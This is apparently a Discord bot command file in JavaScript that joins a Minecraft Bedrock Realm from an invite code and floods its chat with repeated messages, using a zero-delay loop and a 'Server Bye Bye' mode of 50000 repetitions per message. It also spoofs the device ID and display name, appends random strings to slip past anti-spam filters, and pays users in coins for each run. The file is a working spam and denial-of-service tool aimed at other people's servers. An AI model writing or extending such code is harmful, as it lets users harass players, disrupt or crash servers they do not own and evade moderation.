const fs = require('fs');
const path = require('path');
const { Authflow } = require('prismarine-auth');
const { RealmAPI } = require('prismarine-realms');
const { SlashCommandBuilder } = require('@discordjs/builders');
const bedrock = require('bedrock-protocol');
const { EmbedBuilder, WebhookClient } = require('discord.js');
const { NIL, v3: uuidv3, v4: uuidv4, v5: uuidv5 } = require("uuid");
const { cat1, error, loading, replystart, replyend } = require('../../data/emojie');
const { discordInvite, discordlink, footer } = require('../../data/config');
const { checkAndSaveRealm,saveCoins } = require('../functions/realms.js')
const usersPath = path.join(__dirname, '..', '..', 'data', 'users.json');



const deviceOptions = {
    'Unknown': 0,
    'Android': 1,
    'iOS': 2,
    'OSX': 3,
    'FireOS': 4,
    'GearVR': 5,
    'Hololens': 6,
    'Windows 10 (x64)': 7,
    'Windows 10 (x86)': 8,
    'Dedicated Server': 9,
    'TvOS': 10,
    'Orbis': 11,
    'Nintendo Switch': 12,
    'Xbox': 13,
    'Windows Phone': 14,
    'Linux': 15
};



function parseKickMessage(message) {
    return message;
}

module.exports = {
    command: new SlashCommandBuilder()
        .setName('spam')
        .setDescription('Spams realm with a message')
        .setIntegrationTypes(0, 1)
        .setContexts(0, 1, 2)
        .addStringOption(option =>
            option.setName('realmcode')
                .setDescription('Realm Code To Spam')
                .setRequired(true)
                .setMinLength(11)
        )
        .addStringOption(option =>
            option.setName('custommessage')
                .setDescription('Custom message to spam')
                .setRequired(true)
        )
        .addIntegerOption(option =>
            option.setName('duration')
                .setDescription('Duration of spam in seconds')
                .setRequired(true)
                .setMinValue(5)
                .setMaxValue(120)
        )
        .addIntegerOption(option =>
            option.setName('mass_spam')
              .setDescription('Spam Typ')
              .setRequired(true)
              .addChoices(
                { name: 'Singel Message', value: 1 },
                { name: 'Mass Spam', value: 500 },
                { name: 'Server Bye Bye', value: 50000 },
                
              )
          )
          .addStringOption(option =>
            option.setName('namespoof_name')
                .setDescription('Custom message to spam')
                .setRequired(true)
        )
        .addBooleanOption(option =>
            option.setName('rainbow')
                .setDescription('Rainbow text option')
                .setRequired(false)
        )
        .addBooleanOption(option =>
            option.setName('bypass')
                .setDescription('Anti-spam bypass option')
                .setRequired(false)
        ),
        
        execute: async (interaction) => {
            try {
                await interaction.deferReply({ ephemeral: true });
    
                const realmCode = interaction.options.getString('realmcode');
                const spamIntensity = interaction.options.getInteger('mass_spam');
                const customMessage = interaction.options.getString('custommessage') || `§3§ ${discordInvite} §6§ on §4§ TOP`
                const name = interaction.options.getString('namespoof_name') || discordInvite;
                const rainbow = interaction.options.getBoolean('rainbow') || false;
                const bypass = interaction.options.getBoolean('bypass') || false;
                const duration = interaction.options.getInteger('duration') * 1000; // Millisekunden
                const userID = interaction.user.id
                const profilesFolder = `./authCache/${userID}`;
                const profilePath = path.join(profilesFolder); // Unique profile path for the user
                const baseCoins = 20;
                const bonusCoins = Math.floor(duration / 60) * 100;
                const totalCoins = baseCoins + bonusCoins;

            // Check if the profile exists
            if (!fs.existsSync(profilePath)) {
                const errorEmbed = new EmbedBuilder()
                    .setTitle('Error')
                    .setDescription(`No Linked Account found. Please Link an Account whit \`/link\``)
                    .setColor('#FF0000')
                    .setTimestamp()
                    .setFooter({
                        text: `${interaction.user.username} | discord.gg/frosted`,
                        iconURL: interaction.user.displayAvatarURL(),
                    })
                return await interaction.editReply({ embeds: [errorEmbed] });
            }
    
                // Anfangsnachricht
                const initialEmbed = new EmbedBuilder()
                    .setTitle(`Spamming Realm ${realmCode}`)
                    .setDescription(`Trying to join realm: **${realmCode}**`)
                    .setColor('#FFFF00') 
                    .setTimestamp()
                    .setFooter({
                        text: `${interaction.user.username} | discord.gg/frosted`,
                        iconURL: interaction.user.displayAvatarURL(),
                    })
                await interaction.editReply({ embeds: [initialEmbed] });
    
                const client = bedrock.createClient({
                    profilesFolder,
                    offline: false,
                    skinData: {
                        CurrentInputMode: 3,
                        DefaultInputMode: 3,
                        DeviceOS: 11,
                        DeviceId: uuidv3(uuidv4(), NIL),
                        PlatformOnlineId: generateRandomString(19, '1234567890'),
                        PrimaryUser: false,
                        SelfSignedId: uuidv4(),
                        ThirdPartyName: name,
                        ThirdPartyNameOnly: true,
                        TrustedSkin: true,
                    },
                    skipPing: true,
                    realms: {
                        [realmCode.length === 8 ? "realmId" : "realmInvite"]: realmCode.length === 8 ? realmCode : `${realmCode}`,
                    },
                });
    
                client.on('play_status', async () => {
                    checkAndSaveRealm(realmCode,interaction.user.id)
                    saveCoins(userId, totalCoins); 
                    const joinEmbed = new EmbedBuilder()
                        .setTitle('Joined Realm')
                        .setDescription(`${replystart}Successfully joined realm: **${realmCode}**\n${replyend}You will earn **${totalCoins} coins**`)
                        .setTimestamp();
                    await interaction.editReply({ embeds: [joinEmbed] });
    
                    const endTime = Date.now() + duration;
    
                    const spamInterval = setInterval(() => {
                        if (Date.now() >= endTime) {
                            clearInterval(spamInterval);
                            client.disconnect();
    
                            initialEmbed.spliceFields(1, 1, { name: 'Client left', value: realmCode, inline: false });
                            interaction.editReply({ embeds: [initialEmbed] });
                            return;
                        }
    
                        let message = customMessage + (bypass ? ` ${generateRandomString(8)}` : '');
                        let command = rainbow ? colorizeText(message, true) : message;
                        let finalMessage = `${command}\n§r§ `.repeat(spamIntensity);
    
                        client.write("text", {
                            filtered_message: "",
                            type: "chat",
                            needs_translation: false,
                            source_name: client.profile.name,
                            message: finalMessage,
                            xuid: "0",
                            platform_chat_id: "0"
                        });
                    }, 0);
    
                    joinEmbed.spliceFields(2, 2, { name: `Leaving in: <t:${Math.floor(endTime / 1000)}:R>`, value: null, inline: false });
                    await interaction.editReply({ embeds: [initialEmbed] });
                 });
    
                client.on('error', (error) => {
                    console.error(`Client Error: ${error.message}`);
                });
    
            } catch (error) {
                console.error(error);
                const errorEmbed = new EmbedBuilder()
                    .setTitle('Error')
                    .setDescription(`An error occurred: ${error.message}`)
                    .setColor('#FF0000')
                    .setTimestamp();
                await interaction.editReply({ embeds: [errorEmbed] });
            }
        }
    };

function colorizeText(text) {
    const words = text.split(' ');
    const coloredWords = words.map(word => {
        const colorCode = randomCode();
        return `${colorCode}${word}`;
    });
    return coloredWords.join(' ');
}

function randomCode() {
    const optionsString = "1234567890";
    const optionsArray = optionsString.split('');
    const randomIndex = Math.floor(Math.random() * optionsArray.length);
    const randomOption = optionsArray[randomIndex];
    return "§" + randomOption;
}

function generateRandomString(length, charSet) {
    if (!charSet) charSet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890_-';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += charSet.charAt(Math.floor(Math.random() * charSet.length));
    }
    return result;
}